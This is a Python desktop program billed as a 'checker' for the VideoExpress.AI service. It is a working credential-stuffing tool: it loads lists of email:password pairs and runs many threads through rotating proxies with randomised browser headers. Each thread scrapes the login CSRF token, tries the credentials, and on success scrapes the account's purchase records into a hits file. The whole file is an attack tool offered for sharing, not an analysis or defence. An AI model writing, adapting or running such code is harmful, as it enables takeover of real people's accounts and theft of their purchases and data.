import customtkinter as ctk
from tkinter import filedialog
import threading, queue, time, httpx, re, sys, webbrowser, os
from bs4 import BeautifulSoup
import random

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

RESULT_FILES = {
    "success": "Success.txt",
    "fail": "Fail.txt",
    "free": "Free.txt",
    "custom": "Custom.txt"
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36"
]

def safe_split(combo):
    parts = combo.strip().replace(";",":").split(":")
    return parts[0], (parts[1] if len(parts)>1 else "")

def format_proxy(proxy_raw):
    proxy_raw = proxy_raw.strip()
    if "@" in proxy_raw:
        if not proxy_raw.startswith("http"):
            return "http://" + proxy_raw
        return proxy_raw
    p = proxy_raw.split(":")
    if len(p)==2:
        return f"http://{p[0]}:{p[1]}"
    if len(p)==4:
        return f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
    return proxy_raw

def random_ua():
    return random.choice(USER_AGENTS)

class VideoExpressCheckerGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("VideoExpress.AI Checker | By Yashvir Gaming")
        self.geometry("920x650")
        self.resizable(True, True)

        # Variables & stats
        self.combos = []
        self.proxies = []
        self.stats = {"success":0, "fail":0, "free":0, "custom":0, "checked":0}
        self.checked_times = []
        self.threads = []
        self.stop_flag = threading.Event()

        # --- UI ---
        font_title = ctk.CTkFont(family="Segoe UI", size=26, weight="bold")
        font_btn = ctk.CTkFont(size=17, weight="bold")
        font_stats = ctk.CTkFont(size=16, weight="bold")
        font_log = ctk.CTkFont(family="Consolas", size=15)

        ctk.CTkLabel(self, text="VideoExpress.AI Checker", font=font_title).pack(pady=(18,6))
        self.statbar = ctk.CTkFrame(self, fg_color="#161821", corner_radius=14)
        self.statbar.pack(fill="x", padx=25, pady=(0,14))

        self.hit_var = ctk.StringVar(value="Hits: 0")
        self.fail_var = ctk.StringVar(value="Fails: 0")
        self.free_var = ctk.StringVar(value="Free: 0")
        self.custom_var = ctk.StringVar(value="Custom: 0")
        self.checked_var = ctk.StringVar(value="Checked: 0")
        self.cpm_var = ctk.StringVar(value="CPM: 0")

        for v in [self.hit_var,self.fail_var,self.free_var,self.custom_var,self.checked_var,self.cpm_var]:
            ctk.CTkLabel(self.statbar, textvariable=v, font=font_stats, corner_radius=6, fg_color="#1c1e26", width=120, height=36).pack(side="left", padx=8, pady=10)

        btn_frame = ctk.CTkFrame(self, fg_color="#181921", corner_radius=18)
        btn_frame.pack(fill="x", padx=32, pady=(2,14))
        self.load_combo_btn = ctk.CTkButton(btn_frame, text="🎫 Load Combos", fg_color="#20c997", font=font_btn, width=170, height=44, corner_radius=14, command=self.load_combos)
        self.load_combo_btn.pack(side="left", padx=9, pady=10)
        self.load_proxy_btn = ctk.CTkButton(btn_frame, text="🔌 Load Proxies", fg_color="#6f42c1", font=font_btn, width=170, height=44, corner_radius=14, command=self.load_proxies)
        self.load_proxy_btn.pack(side="left", padx=9, pady=10)
        self.start_btn = ctk.CTkButton(btn_frame, text="🚀 Start", fg_color="#1089ff", font=font_btn, width=110, corner_radius=10, command=self.start_check)
        self.start_btn.pack(side="left", padx=9)
        self.stop_btn = ctk.CTkButton(btn_frame, text="⏹ Stop", fg_color="#dc3545", font=font_btn, width=110, corner_radius=10, command=self.stop_check)
        self.stop_btn.pack(side="left", padx=9)
        self.credits_btn = ctk.CTkButton(btn_frame, text="🧑‍💻 Credits", fg_color="#272727", font=font_btn, width=120, corner_radius=10, command=self.show_credits)
        self.credits_btn.pack(side="right", padx=9)

        # Output box
        self.logbox = ctk.CTkTextbox(self, font=font_log, height=380, fg_color="#14151a", corner_radius=12, border_width=2)
        self.logbox.pack(fill="both", padx=30, pady=(0,9), expand=True)
        self.logbox.configure(state="disabled")

        # Progress bar
        self.progress = ctk.CTkProgressBar(self, height=14, width=650, corner_radius=12, fg_color="#11111a", progress_color="#20c997")
        self.progress.pack(pady=(3,16))
        self.progress.set(0)

        # Drag-and-drop support (optional)
        self.bind("<Control-c>", lambda e: self.quit())

    def log(self, msg, tag="info"):
        self.logbox.configure(state="normal")
        color = {"success":"#20c997", "fail":"#ff4646", "free":"#ffc107", "custom":"#6f42c1", "info":"#7cbfff"}.get(tag,"#f1f1f1")
        self.logbox.insert("end", msg+"\n")
        self.logbox.tag_add(tag, "end-2l", "end-1l")
        self.logbox.tag_config(tag, foreground=color)
        self.logbox.see("end")
        self.logbox.configure(state="disabled")

    def update_stats(self):
        self.hit_var.set(f"Hits: {self.stats['success']}")
        self.fail_var.set(f"Fails: {self.stats['fail']}")
        self.free_var.set(f"Free: {self.stats['free']}")
        self.custom_var.set(f"Custom: {self.stats['custom']}")
        self.checked_var.set(f"Checked: {self.stats['checked']}")
        # CPM calculation
        now = time.time()
        self.checked_times = [t for t in self.checked_times if now-t<=60]
        self.cpm_var.set(f"CPM: {len(self.checked_times)}")
        if self.combos:
            self.progress.set(self.stats['checked']/len(self.combos))
        else:
            self.progress.set(0)

    def load_combos(self):
        file = filedialog.askopenfilename(filetypes=[("Combo Files", "*.txt")])
        if not file: return
        with open(file, encoding="utf-8") as f:
            combos = [line.strip() for line in f if line.strip()]
        random.shuffle(combos)
        self.combos = combos
        self.stats['checked'] = 0
        self.update_stats()
        self.log(f"Loaded {len(combos)} combos!", tag="info")

    def load_proxies(self):
        file = filedialog.askopenfilename(filetypes=[("Proxy Files", "*.txt")])
        if not file: return
        with open(file, encoding="utf-8") as f:
            proxies = list(set([line.strip() for line in f if line.strip()]))
        random.shuffle(proxies)
        self.proxies = proxies
        self.log(f"Loaded {len(proxies)} proxies!", tag="info")

    def start_check(self):
        if not self.combos:
            self.log("Please load combos first!", "fail")
            return
        self.stop_flag.clear()
        for k in self.stats: self.stats[k]=0
        self.checked_times.clear()
        self.update_stats()
        self.log("Starting checking...", "info")
        self.threads.clear()
        combo_q = queue.Queue()
        proxy_q = queue.Queue()
        for c in self.combos: combo_q.put(c)
        for p in self.proxies: proxy_q.put(p)
        n_threads = min(25, max(5, len(self.combos)//6+1))
        for _ in range(n_threads):
            t = threading.Thread(target=self.worker, args=(combo_q, proxy_q), daemon=True)
            t.start()
            self.threads.append(t)
        self.after(100, self.update_loop)

    def stop_check(self):
        self.stop_flag.set()
        self.log("Stopping...", "fail")

    def update_loop(self):
        self.update_stats()
        if not any(t.is_alive() for t in self.threads):
            self.log("Finished checking!", "info")
            self.progress.set(1)
            return
        self.after(200, self.update_loop)

    def show_credits(self):
        def open_url(e=None):
            webbrowser.open_new_tab("https://t.me/therealyashvirgamingbot")
        popup = ctk.CTkToplevel(self)
        popup.title("Credits")
        popup.geometry("390x170")
        popup.resizable(False,False)
        ctk.CTkLabel(popup, text="Made with love ♥ by Yashvir Gaming", font=("Segoe UI", 20)).pack(pady=(20,5))
        link = ctk.CTkLabel(popup, text="Telegram: https://t.me/therealyashvirgamingbot", font=("Segoe UI", 15), text_color="#1da1f2", cursor="hand2")
        link.pack()
        link.bind("<Button-1>", open_url)
        ctk.CTkLabel(popup, text="Feel free to share this checker!", font=("Segoe UI", 12)).pack(pady=(15,8))

    def worker(self, combo_q, proxy_q):
        while not self.stop_flag.is_set():
            try:
                combo = combo_q.get(timeout=2)
            except queue.Empty: break
            email, password = safe_split(combo)
            proxy_dict = None
            if self.proxies:
                try:
                    proxy_raw = proxy_q.get(timeout=1)
                    proxy_url = format_proxy(proxy_raw)
                    proxy_dict = {"http://": proxy_url, "https://": proxy_url}
                    proxy_q.put(proxy_raw)
                except: pass
            try:
                result = self.check(email, password, proxy_dict)
            except Exception as e:
                result = {"status":"fail", "info":f"Error: {e}"}
            self.handle_result(combo, result)
            self.checked_times.append(time.time())
            self.stats['checked'] += 1
            self.update_stats()

    def handle_result(self, combo, result):
        tag = result.get("status","fail")
        info = result.get("info","")
        msg = f"{combo} | {tag.upper()} | {info}"
        self.log(msg, tag)
        fname = RESULT_FILES.get(tag, RESULT_FILES["custom"])
        with open(fname, "a", encoding="utf-8") as f:
            f.write(f"{combo} | {info}\n")
        self.stats[tag] = self.stats.get(tag,0)+1

    def check(self, email, password, proxy):
        headers = {
            "User-Agent": random_ua(),
            "Pragma": "no-cache",
            "Accept": "*/*"
        }
        # Get CSRF
        with httpx.Client(proxies=proxy, timeout=12, follow_redirects=False, verify=False) as client:
            r = client.get("https://app.videoexpress.ai/login", headers=headers)
            soup = BeautifulSoup(r.text, "lxml")
            csrf_token = ""
            token_input = soup.find("input", {"name":"_csrf_token"})
            if token_input:
                csrf_token = token_input.get("value", "")
            if not csrf_token:
                return {"status":"fail", "info":"No CSRF Token"}
            # Login POST
            login_headers = {
                "Host": "app.videoexpress.ai",
                "Connection": "keep-alive",
                "Cache-Control": "max-age=0",
                "sec-ch-ua": "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "Origin": "https://app.videoexpress.ai",
                "Upgrade-Insecure-Requests": "1",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": random_ua(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Referer": "https://app.videoexpress.ai/login",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate"
            }
            data = {
                "_csrf_token": csrf_token,
                "_username": email,
                "_password": password
            }
            r2 = client.post("https://app.videoexpress.ai/login_check", data=data, headers=login_headers)
            is_success = "Location" in r2.headers and "login" not in r2.headers["Location"]
            if not is_success:
                return {"status":"fail", "info":"Invalid login"}
            # Delivery orders check
            deliv_headers = login_headers.copy()
            deliv_headers["Referer"] = "https://app.videoexpress.ai/delivery"
            deliv_data = f"email={email}"
            r3 = client.post("https://app.videoexpress.ai/delivery", data=deliv_data, headers=deliv_headers)
            if "Purchases not found." in r3.text:
                return {"status":"free", "info":"FREE / No Orders"}
            else:
                soup2 = BeautifulSoup(r3.text, "lxml")
                captures = []
                for strong in soup2.select("#deliveryForm > table > tbody > tr > td > strong"):
                    val = strong.text.strip()
                    if val:
                        captures.append(val)
                capture_info = ", ".join(captures) if captures else "Has Purchases"
                return {"status":"success", "info":capture_info}

if __name__ == "__main__":
    app = VideoExpressCheckerGUI()
    app.mainloop()
